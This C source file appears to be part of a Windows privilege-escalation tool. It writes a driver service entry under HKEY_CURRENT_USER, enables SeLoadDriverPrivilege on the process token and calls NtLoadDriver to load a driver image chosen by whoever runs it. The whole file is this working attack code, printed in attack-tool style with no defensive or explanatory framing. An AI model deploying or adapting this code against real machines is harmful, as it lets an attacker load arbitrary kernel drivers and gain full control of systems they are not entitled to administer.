#include "loaddriver.h"

ULONG
LoadDriver(LPWSTR userSid, LPWSTR RegistryPath)
{
	UNICODE_STRING DriverServiceName;
	NTSTATUS status;

	typedef NTSTATUS(_stdcall* NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
	typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

	NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
	RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

	wchar_t registryPath[MAX_PATH];
	_snwprintf_s(registryPath, _TRUNCATE, L"%s%s\\%s", REGISTRY_USER_PREFIX, userSid, RegistryPath);

	wprintf(L"[+] Loading Driver: %s\n", registryPath);


	RtlInitUnicodeString(&DriverServiceName, registryPath);

	status = NtLoadDriver(&DriverServiceName);
	printf("NTSTATUS: %08x, WinError: %d\n", status, GetLastError());

	if (!NT_SUCCESS(status))
		//return RtlNtStatusToDosError(status);
		return -1;
	return 0;

}

//https://msdn.microsoft.com/en-us/library/windows/desktop/aa446619(v=vs.85).aspx
BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup
		&luid))        // receives LUID of privilege
	{
		wprintf(L"[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		wprintf(L"[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

ULONG
CreateRegistryKey(
	const LPWSTR RegistryPath,
	const LPWSTR DriverPath
)
{
	ULONG dwErrorCode;
	HKEY hKey;
	DWORD dwDisposition;
	DWORD dwServiceType = 1;
	DWORD dwServiceErrorControl = 1;
	DWORD dwServiceStart = 3;
	SIZE_T ServiceImagePathSize;
	wchar_t registryPath[MAX_PATH], serviceImagePath[MAX_PATH];

	_snwprintf_s(registryPath, _TRUNCATE, L"%s", RegistryPath);
	_snwprintf_s(serviceImagePath, _TRUNCATE, L"%s%s", IMAGE_PATH, DriverPath);

	dwErrorCode = RegCreateKeyExW(HKEY_CURRENT_USER,
		registryPath,
		0,
		NULL,
		0,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	if (dwDisposition != REG_CREATED_NEW_KEY) {
		RegCloseKey(hKey);
		wprintf(L"RegCreateKeyEx failed: 0x%x\n", dwErrorCode);
		return dwErrorCode;
	}

	ServiceImagePathSize = (lstrlenW(serviceImagePath) + 1) * sizeof(WCHAR);

	dwErrorCode = RegSetValueExW(hKey,
		L"ImagePath",
		0,
		REG_EXPAND_SZ,
		(const BYTE*)serviceImagePath,
		ServiceImagePathSize);

	if (dwErrorCode) {
		RegCloseKey(hKey);
		return dwErrorCode;
	}

	dwErrorCode = RegSetValueExW(hKey,
		L"Type",
		0,
		REG_DWORD,
		(const BYTE*)&dwServiceType,
		sizeof(DWORD));

	if (dwErrorCode) {
		RegCloseKey(hKey);
		return dwErrorCode;
	}

	dwErrorCode = RegSetValueExW(hKey,
		L"ErrorControl",
		0,
		REG_DWORD,
		(const BYTE*)&dwServiceErrorControl,
		sizeof(DWORD));
	if (dwErrorCode) {
		RegCloseKey(hKey);
		return dwErrorCode;
	}

	dwErrorCode = RegSetValueExW(hKey,
		L"Start",
		0,
		REG_DWORD,
		(const BYTE*)&dwServiceStart,
		sizeof(DWORD));

	RegCloseKey(hKey);
	return 0;
}


LPWSTR getUserSid(HANDLE hToken)
{

	// Get the size of the memory buffer needed for the SID
	//https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral
	//https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx

	DWORD dwBufferSize = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize) &&
		(GetLastError() != ERROR_INSUFFICIENT_BUFFER))
	{
		wprintf(L"GetTokenInformation failed, error: %d\n",
			GetLastError());
		return NULL;
	}

	//https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral
	PTOKEN_USER pUserToken = (PTOKEN_USER)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		dwBufferSize);

	if (pUserToken == NULL) {
		HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
		return NULL;
	}

	// Retrive token info
	if (!GetTokenInformation(
		hToken,
		TokenUser,
		pUserToken,
		dwBufferSize,
		&dwBufferSize))
	{
		GetLastError();
		return NULL;
	}

	// Check if SID is valid
	if (!IsValidSid(pUserToken->User.Sid))
	{
		wprintf(L"The owner SID is invalid.\n");
		return NULL;
	}

	LPWSTR sidString;
	ConvertSidToStringSidW(pUserToken->User.Sid, &sidString);
	return sidString;
}

int fullsend(LPWSTR RegistryPath, LPWSTR DriverImagePath)
{
	//LPWSTR* szArglist;
	//int nArgs;
	//LPWSTR RegistryPath, DriverImagePath;
	ULONG dwErrorCode;
	int ret = 0;

	//szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	//if (NULL == szArglist)
	//{
	//	printUsage();
	//	return 0;
	//}

	//if (nArgs != 3) {
	//	printUsage();
	//	LocalFree(szArglist);
	//	return 0;
	//}

	//RegistryPath = szArglist[1];
	//DriverImagePath = szArglist[2];

	// Get Current Process Token
	HANDLE hToken;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		wprintf(L"[+] OpenProcessToken Failed\n");
		goto cleanup;
	}

	LPWSTR userSidStr;

	userSidStr = getUserSid(hToken);
	if (userSidStr == NULL)
	{
		wprintf(L"[+] Error while getting user SID\n");
		goto cleanup;
	}

	dwErrorCode = CreateRegistryKey((LPWSTR)RegistryPath, DriverImagePath);
	if (dwErrorCode != 0) {
		wprintf(L"[-] Error while creating registry keys: error value %d\n", dwErrorCode);
		goto cleanup;
	}

	// Enable Privileges
	wprintf(L"[+] Enabling SeLoadDriverPrivilege\n");

	if (SetPrivilege(hToken, SE_LOAD_DRIVER_NAME, true))
		wprintf(L"[+] SeLoadDriverPrivilege Enabled\n");
	else
	{
		wprintf(L"[-] SeLoadDriverPrivilege Failed\n");
		goto cleanup;
	}

	ret = LoadDriver(userSidStr, RegistryPath);

cleanup:
	CloseHandle(hToken);
	hToken = NULL;
	//LocalFree(szArglist);

	return(ret);

}